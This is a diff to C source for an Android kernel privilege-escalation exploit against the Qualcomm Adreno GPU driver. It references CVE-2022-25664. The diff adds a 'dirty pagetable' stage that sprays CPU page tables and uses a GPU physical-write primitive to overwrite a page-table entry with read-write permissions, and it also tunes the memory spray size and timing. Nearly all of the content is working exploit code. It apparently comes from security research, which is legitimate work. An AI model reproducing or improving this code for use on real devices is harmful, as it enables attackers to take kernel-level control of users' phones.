@@ -1,4 +1,5 @@
 #define __BIONIC_DEPRECATED_PAGE_SIZE_MACRO
+#define _GNU_SOURCE
 
 #include <stdint.h>
 #include <stdlib.h>
@@ -112,9 +113,8 @@ int kgsl_gpu_command_payload(int fd, uint32_t ctx_id, uint64_t gpuaddr, uint32_t
     return err;
 }
 
-// TODO(zhuowei): make 2G spray configurable; should be ~1/4 to 1/2 of RAM
-// increased this from 1G to 2G for Pixel 3 XL
-#define NPBUFS 128
+// TODO(zhuowei): make 1G/2G spray configurable; should be ~1/4 to 1/2 of RAM
+#define NPBUFS 64
 
 #define LEVEL1_SHIFT    30
 #define LEVEL1_MASK     (0x1fful << LEVEL1_SHIFT)
@@ -175,7 +175,7 @@ int setup_pagetables(uint8_t *tt0, uint32_t pages, uint32_t tt0phys, uint64_t fa
     return 0;
 }
 
-// #define DUMP_PAGEMAP
+#define DUMP_PAGEMAP
 #ifdef DUMP_PAGEMAP
 // https://github.com/NEWBEE108/linux_kernel_module_Info/blob/master/kernel_module/user/pagemap_dump.c
 // https://github.com/torvalds/linux/blob/master/Documentation/admin-guide/mm/pagemap.rst
@@ -261,7 +261,7 @@ static int DoWrite(int fd, int ctx_id, uint32_t* payload_buf, uint64_t payload_g
     }
     fprintf(stderr, "\n");
 #endif
-    usleep(100000);
+    usleep(200000);
     // we don't need Adrenaline's multiple IB stuff - we just use it to run one IB
     // see https://github.com/github/securitylab/blob/105618fc1fa83c08f4446749e64310b539cb0262/SecurityExploits/Android/Qualcomm/CVE_2022_25664/adreno_kernel/adreno_kernel.c#L188
     int err = kgsl_gpu_command_payload(fd, ctx_id, /*gpuaddr=*/0, /*cmd_size=*/0, /*n=*/1, /*target_idx=*/0, payload_gpuaddr, cmd_size);
@@ -461,12 +461,69 @@ int cheese_shutdown(struct cheese_gpu_rw* cheese) {
     return 0;
 }
 
+int cheese_upgrade_to_pagetable(struct cheese_gpu_rw* cheese) {
+    // GPU is annoying to work with: spray CPU pagetables and use our GPU read-write to overwrite one of them
+    // https://yanglingxi1993.github.io/dirty_pagetable/dirty_pagetable.html
+    uint64_t number_of_pagetable = 32*1024;
+    uint64_t size_of_memory_region = number_of_pagetable * 0x200000;
+    uint64_t mapped_size = size_of_memory_region + 0x200000;
+    const int mapped_count = 6;
+    void* mapped_list[mapped_count];
+    void* start_virtual_address_list[mapped_count];
+    for (int i = 0; i < mapped_count; i++) {
+        void* mapped = mmap((void*)NULL, mapped_size, PROT_READ, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+        if (mapped == MAP_FAILED) {
+            fprintf(stderr, "can't allocate address space: %s\n", strerror(errno));
+            sleep(100000);
+            return 1;
+        }
+        void* start_virtual_address = (void*)((uint64_t)(mapped + 0x1fffffull) & ~0x1fffffull);
+        fprintf(stderr, "%p %p\n", mapped, start_virtual_address);
+        unsigned char *addr = (unsigned char *)start_virtual_address;
+        for (uint64_t i = 0; i < size_of_memory_region; i+= 0x200000) {
+            unsigned char* target = addr + i;
+            if (*target != 0) {
+                fprintf(stderr, "lol what\n");
+            }
+        }
+        mapped_list[i] = mapped;
+        start_virtual_address_list[i] = start_virtual_address;
+    }
+    fprintf(stderr, "alive!\n");
+    // yolo...
+    sleep(1);
+    uint64_t target_pagetable_address = 0xfebea000;
+    uint64_t target_write_physical_address = target_pagetable_address;
+    uint64_t value = target_pagetable_address | ENTRY_VALID | ENTRY_RW |
+        ENTRY_MEMTYPE_NNC | ENTRY_OUTER_SHARE | ENTRY_AF |
+        ENTRY_NG;
+    if (cheese_physwrite(cheese, target_write_physical_address, 2, (uint32_t*)&value)) {
+        fprintf(stderr, "can't write\n");
+        return 1;
+    }
+    sleep(1);
+    for (int attempt = 0; attempt < 2; attempt++) {
+    for (int i = 0; i < mapped_count; i++) {
+        unsigned char* addr = start_virtual_address_list[i]; 
+        for (uint64_t i = 0; i < size_of_memory_region; i+= 0x200000) {
+            if (*(addr + i) != 0) {
+                fprintf(stderr, "something changed: %lx %p\n", i, addr + i);
+                return 0;
+            }
+        }
+    }
+    }
+    fprintf(stderr, "nothing changed\n");
+    return 1;
+}
+
 int main() {
     struct cheese_gpu_rw cheese = {};
     if (cheese_gpu_rw_setup(&cheese)) {
         fprintf(stderr, "can't get GPU r/w\n");
         return 1;
     }
+#if 0
     // crosshatch-rq1a.201205.003.a1
     // /proc/iomem:
     // 80080000-823fffff : Kernel code
@@ -482,6 +539,10 @@ int main() {
         return 1;
     }
     sleep(1);
-    // now check /proc/version
+#endif
+    if (cheese_upgrade_to_pagetable(&cheese)) {
+        fprintf(stderr, "no pagetable\n");
+        return 1;
+    }
     return 0;
 }
